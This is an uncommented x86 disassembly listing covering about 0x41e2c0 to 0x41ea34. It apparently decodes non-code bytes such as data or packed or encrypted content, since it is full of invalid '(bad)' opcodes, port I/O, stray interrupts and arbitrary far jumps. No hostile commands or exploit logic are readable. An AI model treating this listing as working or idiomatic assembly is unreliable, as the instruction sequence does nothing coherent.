  41e2c0:	fidivr DWORD PTR [eax-0x79f4cf7]
  41e2c6:	push   ss
  41e2c7:	int    0x33
  41e2c9:	mov    esp,0x1c478149
  41e2ce:	mov    esp,0x81fddd33
  41e2d3:	loop   0x41e295
  41e2d5:	sub    esp,DWORD PTR [edi]
  41e2d7:	adc    DWORD PTR [ebp-0x27254f87],ebx
  41e2dd:	push   ebp
  41e2de:	int    0xc
  41e2e0:	jecxz  0x41e26c
  41e2e2:	sub    bh,bl
  41e2e4:	pop    ss
  41e2e5:	test   DWORD PTR [edi-0x48f3f9eb],eax
  41e2eb:	mov    cl,dl
  41e2ed:	lods   eax,DWORD PTR ds:[esi]
  41e2ee:	or     BYTE PTR [ecx+0x69],al
  41e2f1:	pop    eax
  41e2f2:	add    cl,al
  41e2f4:	ins    BYTE PTR es:[edi],dx
  41e2f5:	jecxz  0x41e327
  41e2f7:	inc    ebx
  41e2f8:	fwait
  41e2f9:	mov    ebp,0xa4637aff
  41e2fe:	mov    edx,fs
  41e300:	fwait
  41e301:	add    al,0x1d
  41e303:	aad    0x19
  41e305:	or     esi,ecx
  41e307:	mov    edi,0xb9d6d96e
  41e30c:	(bad)  
  41e30d:	xlat   BYTE PTR ds:[ebx]
  41e30e:	mov    dl,0xfc
  41e310:	xor    DWORD PTR [edx-0x31],ecx
  41e313:	pop    esi
  41e314:	push   ebx
  41e315:	iret   
  41e316:	out    0x23,eax
  41e318:	xchg   DWORD PTR [esp+edi*8],edx
  41e31b:	popf   
  41e31c:	rcl    DWORD PTR [edx],cl
  41e31e:	daa    
  41e31f:	pop    es
  41e320:	rol    DWORD PTR [edx+eiz*2+0x13],0x2d
  41e325:	or     BYTE PTR [ebx-0x20],bl
  41e328:	or     BYTE PTR [edi+0x4d798cc8],ch
  41e32e:	adc    eax,0xec8bb8ca
  41e333:	mov    ds:0x28c8f911,al
  41e338:	or     DWORD PTR [edi],ebp
  41e33a:	into   
  41e33b:	into   
  41e33c:	int3   
  41e33d:	mov    ebp,ebx
  41e33f:	cvtdq2ps xmm4,xmm1
  41e342:	inc    DWORD PTR [esi+0x4c]
  41e345:	mov    ebp,0x5b712dd4
  41e34a:	mov    ebp,0x1feb910f
  41e34f:	dec    ebx
  41e350:	repnz pop eax
  41e352:	sub    bh,dh
  41e354:	std    
  41e355:	xchg   ecx,eax
  41e356:	repnz sbb DWORD PTR [ebp-0x77fb0985],edx
  41e35d:	test   BYTE PTR [edi-0x5c],dh
  41e360:	jg     0x41e331
  41e362:	dec    esi
  41e363:	out    dx,al
  41e364:	je     0x41e35e
  41e366:	mov    ebx,0x3112c3c
  41e36b:	and    edi,DWORD PTR [ebp+0x4588fbf4]
  41e371:	out    dx,eax
  41e372:	push   esi
  41e373:	jle    0x41e355
  41e375:	mov    esp,0x89c96cf0
  41e37a:	repnz xor ebp,DWORD PTR [esi+0x1e]
  41e37e:	scas   eax,DWORD PTR es:[edi]
  41e37f:	push   ds
  41e380:	popa   
  41e381:	sar    ch,cl
  41e383:	pop    esi
  41e384:	pop    ss
  41e385:	jmp    0x133f801
  41e38a:	dec    edi
  41e38b:	bound  eax,QWORD PTR [ebx+0x55f8ddee]
  41e391:	jmp    0x85b64f14
  41e396:	ret    
  41e397:	iret   
  41e398:	in     al,0x9f
  41e39a:	mov    cl,0xb1
  41e39c:	imul   DWORD PTR [esp+eax*2+0x62]
  41e3a0:	es or  esi,edx
  41e3a3:	xor    BYTE PTR [eax],ch
  41e3a5:	lds    ebp,FWORD PTR [ecx]
  41e3a7:	inc    edx
  41e3a8:	xlat   BYTE PTR ds:[ebx]
  41e3a9:	push   edi
  41e3aa:	test   DWORD PTR [edx-0x66],eax
  41e3ad:	push   cs
  41e3ae:	dec    ecx
  41e3af:	out    dx,eax
  41e3b0:	daa    
  41e3b1:	(bad)  
  41e3b2:	adc    ecx,DWORD PTR [edx+0x64aedfb7]
  41e3b8:	and    bl,BYTE PTR [ebp-0x3d]
  41e3bb:	ja     0x41e369
  41e3bd:	push   ebp
  41e3be:	adc    DWORD PTR [ecx-0x67],ebx
  41e3c1:	fs pop esp
  41e3c3:	in     eax,0x3c
  41e3c5:	jp     0x41e3b1
  41e3c7:	add    edx,edx
  41e3c9:	mov    ebp,ebp
  41e3cb:	nop
  41e3cc:	jmp    0x41e429
  41e3ce:	push   ebx
  41e3cf:	mov    ds:0x7cc58c56,al
  41e3d4:	mov    al,ds:0x6c1ce12c
  41e3d9:	in     al,dx
  41e3da:	lods   al,BYTE PTR ds:[esi]
  41e3db:	gs or  DWORD PTR gs:[edx],0xf55ca73c
  41e3e3:	out    dx,eax
  41e3e4:	test   bh,ch
  41e3e6:	outs   dx,DWORD PTR ds:[esi]
  41e3e7:	call   0xfc:0x9b9df2
  41e3ee:	add    BYTE PTR [eax],al
  41e3f0:	add    BYTE PTR [eax],al
  41e3f2:	add    al,0xf8
  41e3f5:	and    eax,edi
  41e3f7:	cmp    ecx,ebx
  41e3f9:	loope  0x41e3df
  41e3fb:	mov    esi,0x3ab2fc94
  41e400:	loop   0x41e3fa
  41e402:	or     eax,0xf300015f
  41e407:	add    al,0x0
  41e409:	add    BYTE PTR [ebx-0x23],dl
  41e40c:	sbb    edi,DWORD PTR [edi+0x46f158e7]
  41e412:	rcr    esp,1
  41e414:	mov    ebp,0x94efb9a1
  41e419:	call   0x4978:0x88a7d6a0
  41e420:	push   0x3d
  41e422:	xchg   esi,eax
  41e423:	pop    edx
  41e424:	(bad)  
  41e425:	mov    bh,0xf5
  41e427:	jae    0x41e498
  41e429:	cmp    eax,0x844e775f
  41e42e:	icebp  
  41e42f:	stc    
  41e430:	sbb    BYTE PTR [edi],bl
  41e432:	mul    DWORD PTR [eax]
  41e434:	and    eax,0xf31c6cea
  41e439:	push   edx
  41e43a:	in     al,dx
  41e43b:	adc    ebp,esp
  41e43d:	faddp  st(1),st
  41e43f:	adc    eax,0x67b985a8
  41e444:	test   DWORD PTR [ebp+edx*4-0x28],edi
  41e448:	lods   eax,DWORD PTR ds:[esi]
  41e449:	mov    eax,0x58ba760d
  41e44e:	jnp    0x41e3e3
  41e450:	(bad)  
  41e452:	mov    ebp,0xb1cde66f
  41e457:	cld    
  41e458:	sub    esp,ecx
  41e45a:	les    esi,FWORD PTR [eax-0x7a]
  41e45d:	adc    al,BYTE PTR [esi+0x6b]
  41e460:	shl    BYTE PTR [ecx+0x58c83e19],cl
  41e466:	jnp    0x41e402
  41e468:	xchg   esp,eax
  41e469:	repz xor edi,DWORD PTR [ebp+0x14]
  41e46d:	fs scas al,BYTE PTR es:[edi]
  41e46f:	mov    ebp,DWORD PTR [ecx-0x11fa5d0e]
  41e475:	jne    0x41e44e
  41e477:	or     eax,edx
  41e479:	lahf   
  41e47a:	shr    cl,0xd7
  41e47d:	add    eax,0xaa414458
  41e482:	sub    ah,bh
  41e484:	(bad)  
  41e486:	je     0x41e499
  41e488:	adc    cl,cl
  41e48a:	adc    ecx,DWORD PTR [ebx+ecx*8+0x53]
  41e48e:	mov    al,ds:0x475bf12e
  41e493:	pusha  
  41e494:	outs   dx,BYTE PTR ds:[esi]
  41e495:	call   0x7c517933
  41e49a:	pushf  
  41e49b:	sbb    DWORD PTR [ecx-0x7c1fc100],eax
  41e4a1:	leave  
  41e4a2:	(bad)  
  41e4a3:	push   edi
  41e4a4:	mov    ds:0xaaa47b91,eax
  41e4a9:	xchg   edi,eax
  41e4aa:	dec    ebp
  41e4ab:	repnz cld 
  41e4ad:	xlat   BYTE PTR ds:[ebx]
  41e4ae:	fwait
  41e4af:	test   DWORD PTR [ecx+0x50],esp
  41e4b2:	imul   edx,DWORD PTR [eax-0x5b],0x67b27069
  41e4b9:	xor    eax,0xf96590dc
  41e4be:	xor    DWORD PTR [ecx-0x1f],esp
  41e4c1:	cwde   
  41e4c2:	xchg   BYTE PTR [edx],bh
  41e4c4:	mov    edx,0xe83136da
  41e4c9:	jne    0x41e4bc
  41e4cb:	jo     0x41e4a2
  41e4cd:	push   es
  41e4ce:	dec    ebx
  41e4cf:	jg     0x41e50b
  41e4d1:	ins    BYTE PTR es:[edi],dx
  41e4d2:	or     al,0xce
  41e4d4:	or     BYTE PTR [esi],ah
  41e4d6:	adc    ebp,ebx
  41e4d8:	pusha  
  41e4d9:	push   edi
  41e4da:	stos   DWORD PTR es:[edi],eax
  41e4db:	lea    ebx,[ebx-0x71836293]
  41e4e1:	fmul   QWORD PTR [edx-0x2abf93b3]
  41e4e7:	fidiv  DWORD PTR [esi+0xb90a776]
  41e4ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4ee:	sbb    edi,ebx
  41e4f0:	jmp    0x67b7c0af
  41e4f5:	xchg   esp,eax
  41e4f6:	lods   al,BYTE PTR ds:[esi]
  41e4f7:	pop    edx
  41e4f8:	icebp  
  41e4f9:	cmp    BYTE PTR [ebx],ah
  41e4fb:	scas   al,BYTE PTR es:[edi]
  41e4fc:	aaa    
  41e4fd:	xchg   ebx,eax
  41e4fe:	dec    esi
  41e4ff:	xor    bl,BYTE PTR [edi]
  41e501:	mov    esp,0x1a496be9
  41e506:	sbb    DWORD PTR [ebp-0x52],0x7aed98c5
  41e50d:	lods   al,BYTE PTR ds:[esi]
  41e50e:	adc    eax,0xef2c31f
  41e513:	fs iret 
  41e515:	lahf   
  41e516:	lahf   
  41e517:	je     0x41e49c
  41e519:	mov    ebp,eax
  41e51b:	fisub  WORD PTR [edi]
  41e51d:	in     al,0xcf
  41e51f:	(bad)  
  41e520:	jno    0x41e4e6
  41e522:	xchg   edi,eax
  41e523:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e524:	js     0x41e511
  41e526:	repnz inc ecx
  41e528:	ss (bad) 
  41e52a:	xchg   ebp,eax
  41e52b:	ja     0x41e4c1
  41e52d:	retf   0xc401
  41e530:	xchg   DWORD PTR [ecx-0x20],esi
  41e533:	jb     0x41e591
  41e535:	push   esp
  41e536:	out    0xd1,al
  41e538:	cs push es
  41e53a:	pop    ds
  41e53b:	imul   edx,eax,0xffffffbc
  41e53e:	adc    al,0x24
  41e540:	test   BYTE PTR [ebx+0x3e],0x58
  41e544:	jns    0x41e52a
  41e546:	mov    eax,0x366d96d9
  41e54b:	nop
  41e54c:	and    eax,0x2762ef47
  41e551:	push   cs
  41e552:	xchg   edi,eax
  41e553:	xor    DWORD PTR [edi+ebp*1],eax
  41e556:	cs jo  0x41e500
  41e559:	and    BYTE PTR [ebx+0x26],0xd1
  41e55d:	retf   0x3bdc
  41e560:	aam    0x51
  41e562:	push   ds
  41e563:	add    BYTE PTR [ebx+0x24e0e99],ah
  41e569:	rol    edx,1
  41e56b:	adc    DWORD PTR [ebp+0x4206fd2f],edx
  41e571:	mov    cl,dh
  41e573:	or     al,0xdf
  41e575:	xor    al,0x4a
  41e577:	in     al,0x5
  41e579:	mov    esp,0x19fed0b
  41e57e:	mov    ch,0x68
  41e580:	mov    ds:0x43db7aa,al
  41e585:	aas    
  41e586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e587:	inc    eax
  41e588:	loop   0x41e510
  41e58a:	lods   eax,DWORD PTR ds:[esi]
  41e58b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e58c:	sbb    al,0x99
  41e58e:	in     eax,0x23
  41e590:	push   ecx
  41e591:	xchg   ebp,eax
  41e592:	dec    edi
  41e593:	mov    eax,0x7de1d106
  41e598:	mov    ah,0xed
  41e59a:	stos   DWORD PTR es:[edi],eax
  41e59b:	dec    esp
  41e59c:	or     ebp,DWORD PTR [eax]
  41e59e:	(bad)  
  41e59f:	jb     0x41e52e
  41e5a1:	mov    WORD PTR [esi],gs
  41e5a3:	add    eax,0xdde432aa
  41e5a8:	loop   0x41e5f6
  41e5aa:	cmc    
  41e5ab:	dec    esp
  41e5ac:	dec    ecx
  41e5ad:	jg     0x41e62b
  41e5af:	dec    ebx
  41e5b0:	dec    ebx
  41e5b1:	push   ecx
  41e5b2:	jbe    0x41e593
  41e5b4:	stos   BYTE PTR es:[edi],al
  41e5b5:	pop    edx
  41e5b6:	or     eax,0xbf705393
  41e5bb:	mov    WORD PTR [esi+0x35],cs
  41e5be:	shl    BYTE PTR [esi-0x64],1
  41e5c1:	mov    dl,0xd5
  41e5c3:	adc    al,0xbb
  41e5c5:	mov    BYTE PTR [edx],0xed
  41e5c8:	iret   
  41e5c9:	stos   DWORD PTR es:[edi],eax
  41e5ca:	fs mov ecx,0xad37ba8a
  41e5d0:	adc    dh,bh
  41e5d2:	loop   0x41e5ce
  41e5d4:	lds    ebp,FWORD PTR [ebx-0xa]
  41e5d7:	ret    0xbed5
  41e5da:	sbb    eax,0x29b19d1c
  41e5df:	loopne 0x41e5af
  41e5e1:	mov    esp,0x2047ed15
  41e5e6:	mov    cl,0xd5
  41e5e8:	xchg   ecx,eax
  41e5e9:	xor    DWORD PTR [esi+0x291894e2],0x7d
  41e5f0:	cmc    
  41e5f1:	jns    0x41e603
  41e5f3:	sbb    ch,BYTE PTR ds:0xbc0b3874
  41e5f9:	pop    ebx
  41e5fa:	sbb    al,0x62
  41e5fc:	ficom  WORD PTR [esi+ebx*8+0x6da6cf01]
  41e603:	fcom   DWORD PTR [edi+0x1210cf28]
  41e609:	and    BYTE PTR [esp+edi*1+0x43eb02de],ch
  41e610:	sub    BYTE PTR ds:0xd54ddb3c,bh
  41e616:	(bad)  
  41e617:	or     eax,0xba6a6707
  41e61c:	fs mov edi,0x92c68b0f
  41e622:	adc    edx,DWORD PTR [edx]
  41e624:	ror    ebx,cl
  41e626:	int    0x2e
  41e628:	std    
  41e629:	pop    ebp
  41e62a:	ds push es
  41e62c:	mov    dl,0xf5
  41e62e:	fprem  
  41e630:	mov    cl,dh
  41e632:	sti    
  41e633:	inc    ecx
  41e634:	mov    DWORD PTR [ecx-0x28],edi
  41e637:	ret    0xaee8
  41e63a:	push   edi
  41e63b:	aam    0x8f
  41e63d:	or     eax,0xc9deabe8
  41e642:	stos   DWORD PTR es:[edi],eax
  41e643:	sub    eax,0xd4529c41
  41e648:	jns    0x41e5dc
  41e64a:	mov    eax,ds:0xd5a825d0
  41e64f:	add    edi,DWORD PTR [edx]
  41e651:	sti    
  41e652:	arpl   dx,di
  41e654:	sbb    ebp,DWORD PTR [edx-0x5b]
  41e657:	and    BYTE PTR [edi+0x44cd000b],ah
  41e65d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e65e:	test   DWORD PTR [eax],esp
  41e660:	cmp    esi,edi
  41e662:	das    
  41e663:	lock stc 
  41e665:	xchg   dl,ch
  41e667:	fisttp WORD PTR [esi+ecx*1-0x14fbb45e]
  41e66e:	(bad)  
  41e670:	cmp    DWORD PTR [edi+0x1956f638],0xe5543cc7
  41e67a:	sahf   
  41e67b:	data16 mov al,ds:0x333c454e
  41e681:	int    0x40
  41e683:	sub    al,0x32
  41e685:	add    edi,edi
  41e687:	xor    DWORD PTR [ebx+0x70],edx
  41e68a:	clc    
  41e68b:	icebp  
  41e68c:	clc    
  41e68d:	mov    eax,ds:0x3aa8b216
  41e692:	jo     0x41e70c
  41e694:	sti    
  41e695:	xchg   ebp,eax
  41e696:	cmp    cl,bl
  41e698:	jecxz  0x41e61f
  41e69a:	fadd   DWORD PTR [ecx-0x127d1a9a]
  41e6a0:	jecxz  0x41e658
  41e6a2:	pop    ds
  41e6a3:	retf   0xd9d
  41e6a6:	cmp    BYTE PTR [ebx+0x1e],bh
  41e6a9:	test   DWORD PTR [edx-0x7a],ebx
  41e6ac:	popf   
  41e6ad:	cld    
  41e6ae:	inc    esp
  41e6af:	mov    ss,eax
  41e6b1:	jae    0x41e6da
  41e6b3:	(bad)  
  41e6b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6b5:	fsub   DWORD PTR [edx-0x76c12add]
  41e6bb:	xor    edi,DWORD PTR [eax+0x6ed7e298]
  41e6c1:	pop    eax
  41e6c2:	enter  0xb7a2,0x10
  41e6c6:	int3   
  41e6c7:	jnp    0x41e73a
  41e6c9:	pusha  
  41e6ca:	cmp    eax,DWORD PTR [ecx]
  41e6cc:	iret   
  41e6cd:	fwait
  41e6ce:	and    eax,0x9a4871c8
  41e6d3:	ficom  WORD PTR [eax+edx*8+0x2]
  41e6d7:	mov    edi,0x86c0577f
  41e6dc:	pop    ds
  41e6dd:	ins    BYTE PTR es:[edi],dx
  41e6de:	mov    al,ds:0xed1f2573
  41e6e3:	retf   
  41e6e4:	mov    ds:0xc7beae44,eax
  41e6e9:	fs repnz add ebx,DWORD PTR cs:[edx]
  41e6ee:	iret   
  41e6ef:	icebp  
  41e6f0:	adc    ebx,DWORD PTR [esi-0x3e656f1c]
  41e6f6:	xor    DWORD PTR [ebx-0x2b],ebp
  41e6f9:	stos   BYTE PTR es:[edi],al
  41e6fa:	cmp    DWORD PTR ds:0x399786e7,0xffffffe5
  41e701:	push   ecx
  41e702:	lea    edi,[eax+eax*2]
  41e705:	adc    BYTE PTR [edi],ah
  41e707:	dec    ebx
  41e708:	dec    edi
  41e709:	sub    ecx,DWORD PTR [ebx+0x46]
  41e70c:	xor    BYTE PTR [edi-0xa],al
  41e70f:	push   ds
  41e710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e711:	rol    DWORD PTR [eax+0x13],1
  41e714:	int    0xbd
  41e716:	mov    ch,0x10
  41e718:	mov    esp,0x4854bfce
  41e71d:	ins    DWORD PTR es:[edi],dx
  41e71e:	(bad)  
  41e71f:	sbb    esi,DWORD PTR [eax+ebx*2-0x1d]
  41e723:	aas    
  41e724:	lock pop es
  41e726:	dec    ebp
  41e727:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41e729:	retf   0xd3c6
  41e72c:	stos   BYTE PTR es:[edi],al
  41e72d:	jg     0x41e6fb
  41e72f:	jg     0x41e743
  41e731:	push   ebx
  41e732:	in     eax,dx
  41e733:	out    dx,al
  41e734:	dec    edi
  41e735:	cmc    
  41e736:	stc    
  41e737:	inc    ebp
  41e738:	jbe    0x41e743
  41e73a:	pushf  
  41e73b:	cvttps2pi mm7,QWORD PTR [ebx+0x47]
  41e73f:	or     al,0x64
  41e741:	ret    0x93f6
  41e744:	ret    
  41e745:	iret   
  41e746:	adc    al,0x1e
  41e748:	xchg   ebp,eax
  41e749:	bound  esp,QWORD PTR [edi-0x2af89de7]
  41e74f:	cld    
  41e750:	pop    ebp
  41e751:	xor    dl,ch
  41e753:	adc    eax,esp
  41e755:	out    0xb6,eax
  41e757:	jl     0x41e7d5
  41e759:	adc    BYTE PTR [esi+0x13],ch
  41e75c:	dec    edi
  41e75d:	dec    esp
  41e75e:	and    eax,0x7979f070
  41e763:	loop   0x41e764
  41e765:	jmp    0x41e78f
  41e767:	cmc    
  41e768:	jle    0x41e742
  41e76a:	jnp    0x41e7db
  41e76c:	pop    ecx
  41e76d:	test   al,0x7a
  41e76f:	mov    eax,0x67a242b3
  41e774:	push   0x22
  41e776:	xlat   BYTE PTR ds:[ebx]
  41e777:	ret    0xbbb1
  41e77a:	pop    ebx
  41e77b:	rcl    BYTE PTR [eax],0xc2
  41e77e:	aam    0x7d
  41e780:	cmp    ebp,0xfd96e79
  41e786:	or     eax,0xf5539f0a
  41e78b:	push   edx
  41e78c:	fucomi st,st(0)
  41e78e:	rol    DWORD PTR [ebp-0x519cfcb7],0xd0
  41e795:	enter  0xd18f,0x4b
  41e799:	pop    edi
  41e79a:	xchg   ebx,eax
  41e79b:	js     0x41e734
  41e79d:	lea    ebp,[ecx]
  41e79f:	mov    bh,0x58
  41e7a1:	frstor [eax-0x5ee1905a]
  41e7a7:	dec    ebp
  41e7a8:	xor    edi,DWORD PTR [eax+0x7634e099]
  41e7ae:	ja     0x41e801
  41e7b0:	jne    0x41e7aa
  41e7b2:	add    al,0x7a
  41e7b4:	bound  edi,QWORD PTR [eax-0x6215c43a]
  41e7ba:	cmp    ch,bl
  41e7bc:	or     DWORD PTR [esp+ebp*2-0x28],ecx
  41e7c0:	push   0x7745496a
  41e7c5:	add    al,0xd6
  41e7c7:	or     BYTE PTR [edi-0x2bfcf1ce],0x8a
  41e7ce:	sub    esi,esp
  41e7d0:	lods   eax,DWORD PTR ds:[esi]
  41e7d1:	or     BYTE PTR [eax+0x79],dh
  41e7d4:	jl     0x41e7ad
  41e7d6:	arpl   WORD PTR [edi+0x3eee9287],ax
  41e7dc:	test   al,0x20
  41e7de:	outs   dx,BYTE PTR ds:[esi]
  41e7df:	add    esi,ebp
  41e7e1:	jmp    0x7c6a:0x6bcf5dfa
  41e7e8:	xchg   ebp,eax
  41e7e9:	clc    
  41e7ea:	fcmovb st,st(3)
  41e7ec:	retf   0x73e1
  41e7ef:	rol    BYTE PTR [edi+eiz*8+0x25],0x34
  41e7f4:	mov    edi,0x8f0951b4
  41e7f9:	pop    ebx
  41e7fa:	div    BYTE PTR ds:0xc53445f
  41e800:	fst    DWORD PTR [eax]
  41e802:	jno    0x41e7d6
  41e804:	ror    BYTE PTR [edx],0xfe
  41e807:	sbb    eax,0x15eab485
  41e80c:	les    esp,FWORD PTR [edx-0x27]
  41e80f:	mov    dh,0x90
  41e811:	add    BYTE PTR [ebx+0x32b3d314],bl
  41e817:	inc    eax
  41e818:	push   cs
  41e819:	sub    DWORD PTR [edi-0x20f2b863],ebx
  41e81f:	push   ebx
  41e820:	mov    eax,ds:0x70db7d79
  41e825:	(bad)
  41e829:	fdivrp st(5),st
  41e82b:	or     BYTE PTR [eax+0x43e0b4a6],bl
  41e831:	cmp    cl,BYTE PTR [edi-0x4b]
  41e834:	or     DWORD PTR [ebp+ebp*2-0x56],ecx
  41e838:	or     ecx,edx
  41e83a:	and    ch,BYTE PTR [ecx+0x14bb9c60]
  41e840:	xchg   esi,eax
  41e841:	lahf   
  41e842:	jg     0x41e7f6
  41e844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e845:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e846:	lea    edx,[eax-0x47b89f45]
  41e84c:	adc    al,0xd5
  41e84e:	mov    BYTE PTR [eax+0x796585de],al
  41e854:	mov    al,ds:0xb156043a
  41e859:	call   DWORD PTR [edi+0x82d4d83]
  41e85f:	cmp    esi,DWORD PTR [edi+0xf0f8df6]
  41e865:	push   ecx
  41e866:	fs aam 0xcb
  41e869:	mov    DWORD PTR [edx+0x73858b24],eax
  41e86f:	push   esp
  41e870:	push   0x92db7b4d
  41e875:	mov    dl,0x7d
  41e877:	shr    BYTE PTR [edx+0x3c607283],0xad
  41e87e:	rol    ah,0x36
  41e881:	mov    cl,0x78
  41e883:	(bad)  
  41e884:	pop    ecx
  41e885:	xchg   ecx,eax
  41e886:	imul   esp,DWORD PTR [edi-0x28],0x4ab12c90
  41e88d:	sub    BYTE PTR [ecx+esi*1-0x1768b71b],al
  41e894:	sub    eax,0x8ff7cf6b
  41e899:	(bad)  
  41e89a:	push   0xcea6002d
  41e89f:	inc    edx
  41e8a0:	pop    ecx
  41e8a1:	sub    al,0x2e
  41e8a3:	into   
  41e8a4:	ret    
  41e8a5:	(bad)  
  41e8a6:	dec    ebp
  41e8a7:	mov    eax,ds:0xf8ebae41
  41e8ac:	fwait
  41e8ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8af:	in     al,dx
  41e8b0:	sar    DWORD PTR [ebx-0x2d601750],0x3b
  41e8b7:	pop    edx
  41e8b8:	adc    DWORD PTR [edx],ecx
  41e8ba:	add    BYTE PTR [ebx+0x22],dh
  41e8bd:	outs   dx,BYTE PTR ds:[esi]
  41e8be:	outs   dx,DWORD PTR ds:[esi]
  41e8bf:	mov    ecx,0x87a83ba9
  41e8c4:	or     al,0x3e
  41e8c6:	jo     0x41e887
  41e8c8:	dec    esp
  41e8c9:	jmp    0x52d8:0x2cbd5c48
  41e8d0:	mov    ebx,0x93ad5d93
  41e8d5:	loopne 0x41e8be
  41e8d7:	mov    WORD PTR [ecx+0x6b],cs
  41e8da:	and    eax,0x57d84cca
  41e8df:	push   ds
  41e8e0:	push   es
  41e8e1:	add    al,0x37
  41e8e3:	popf   
  41e8e4:	cmp    dl,BYTE PTR [ecx+0x4a]
  41e8e7:	repnz adc edx,0xffffffff
  41e8eb:	or     BYTE PTR [ebx+0x707e9377],0x92
  41e8f2:	cmp    BYTE PTR [ecx+0x10603918],cl
  41e8f8:	mov    ebx,ebx
  41e8fa:	daa    
  41e8fb:	shld   DWORD PTR [eax],eax,cl
  41e8fe:	add    BYTE PTR [eax],al
  41e900:	add    BYTE PTR [eax],al
  41e902:	jg     0x41e97c
  41e904:	mov    ecx,0xffd5bf55
  41e909:	jp     0x41e931
  41e90b:	ret    0x676d
  41e90e:	dec    edx
  41e90f:	sub    BYTE PTR [edi],al
  41e911:	dec    ecx
  41e912:	add    BYTE PTR [ecx+eax*1+0x0],ah
  41e916:	repz add al,0x0
  41e919:	add    BYTE PTR ds:0xe0155e38,dh
  41e91f:	aad    0x8d
  41e921:	ret    
  41e922:	xchg   ebx,eax
  41e923:	ret    
  41e924:	call   0x6b3f93f2
  41e929:	sub    esp,ebx
  41e92b:	rol    bl,cl
  41e92d:	out    0x44,al
  41e92f:	cs xchg edx,eax
  41e931:	scas   al,BYTE PTR es:[edi]
  41e932:	outs   dx,DWORD PTR ds:[esi]
  41e933:	xchg   esp,eax
  41e934:	dec    edx
  41e935:	xlat   BYTE PTR ds:[ebx]
  41e936:	fisubr DWORD PTR [ebx]
  41e938:	loop   0x41e8eb
  41e93a:	push   es
  41e93b:	pushf  
  41e93c:	lods   eax,DWORD PTR ds:[esi]
  41e93d:	(bad)  
  41e93e:	xchg   ecx,eax
  41e93f:	inc    ebx
  41e940:	fcmovne st,st(5)
  41e942:	gs int3 
  41e944:	les    edi,FWORD PTR [ebp-0xe5bec6d]
  41e94a:	xchg   ecx,eax
  41e94b:	and    cl,dh
  41e94d:	sti    
  41e94e:	repnz rcr DWORD PTR es:[eax],cl
  41e952:	pusha  
  41e953:	gs dec ecx
  41e955:	test   BYTE PTR [edi+0x60],al
  41e958:	pusha  
  41e959:	inc    esi
  41e95a:	fidiv  DWORD PTR [ebp+0x1a86c55b]
  41e960:	scas   eax,DWORD PTR es:[edi]
  41e961:	jno    0x41e96b
  41e963:	mov    ah,0x69
  41e965:	inc    eax
  41e966:	popf   
  41e967:	or     al,0xc5
  41e969:	mov    al,BYTE PTR [edx]
  41e96b:	cwde   
  41e96c:	pop    edx
  41e96d:	sub    dh,al
  41e96f:	mov    edx,0xebf645ed
  41e974:	lahf   
  41e975:	fild   WORD PTR [eax]
  41e977:	out    dx,eax
  41e978:	int3   
  41e979:	fimul  DWORD PTR [ebx]
  41e97b:	and    al,0x1
  41e97d:	push   0x6d8a8cf0
  41e982:	loope  0x41e910
  41e984:	and    eax,0x7af74cb1
  41e989:	ret    0xb465
  41e98c:	jmp    0x71b58b1f
  41e991:	mov    ebx,0xf92cbb4a
  41e996:	out    0x93,al
  41e998:	or     ecx,ebp
  41e99a:	jae    0x41ea07
  41e99c:	add    al,BYTE PTR [edx]
  41e99e:	ja     0x41e94f
  41e9a0:	adc    al,0x99
  41e9a2:	repz addr16 (bad) 
  41e9a5:	push   esp
  41e9a6:	pushf  
  41e9a7:	push   ebx
  41e9a8:	lods   eax,DWORD PTR ds:[esi]
  41e9a9:	repnz nop
  41e9ab:	ficom  WORD PTR [edx+0x52]
  41e9ae:	test   al,ah
  41e9b0:	pop    ebp
  41e9b1:	and    edx,DWORD PTR [esi+0x36ea03c7]
  41e9b7:	ins    BYTE PTR es:[edi],dx
  41e9b8:	pop    edi
  41e9b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9ba:	push   es
  41e9bb:	imul   edi,DWORD PTR [ecx],0x63
  41e9be:	fcmovnbe st,st(1)
  41e9c0:	es sahf 
  41e9c2:	xchg   ebx,eax
  41e9c3:	mov    esp,0x214928c9
  41e9c8:	xor    BYTE PTR [eax-0xb802401],bl
  41e9ce:	dec    esi
  41e9cf:	ins    BYTE PTR es:[edi],dx
  41e9d0:	inc    DWORD PTR ds:0x242acb60
  41e9d6:	cmp    edx,esi
  41e9d8:	fdivr  DWORD PTR [ecx-0x65]
  41e9db:	(bad)  
  41e9dc:	iret   
  41e9dd:	jge    0x41e98b
  41e9df:	jge    0x41e9e0
  41e9e1:	adc    DWORD PTR [ebp+0x1b68cdde],esi
  41e9e7:	aas    
  41e9e8:	push   0xffffffc6
  41e9ea:	adc    BYTE PTR gs:[ebx-0x635ba603],dh
  41e9f1:	jo     0x41ea36
  41e9f3:	or     al,0xbc
  41e9f5:	ror    ebp,1
  41e9f7:	pop    ecx
  41e9f8:	vunpckhps xmm5,xmm4,XMMWORD PTR [ebx+0x7f]
  41e9fd:	out    dx,eax
  41e9fe:	lahf   
  41e9ff:	mov    dl,0x9e
  41ea01:	rol    BYTE PTR [edx+0x13],0x82
  41ea05:	xor    edi,DWORD PTR [ecx+0x49d0cd51]
  41ea0b:	out    dx,al
  41ea0c:	call   FWORD PTR [esi]
  41ea0e:	inc    edx
  41ea0f:	jecxz  0x41e9e0
  41ea11:	jns    0x41ea23
  41ea13:	sbb    edi,edi
  41ea15:	outs   dx,DWORD PTR ds:[esi]
  41ea16:	or     BYTE PTR [esp+ebp*4],cl
  41ea19:	addr16 xor eax,0x8b339f0
  41ea1f:	les    ebp,FWORD PTR [ebx-0x6e]
  41ea22:	fidiv  DWORD PTR [ebp-0x2d389edc]
  41ea28:	repz jge 0x41ea84
  41ea2b:	not    BYTE PTR [ecx-0x166e3284]
  41ea31:	clc    
  41ea32:	(bad)  
  41ea34:	push   cs
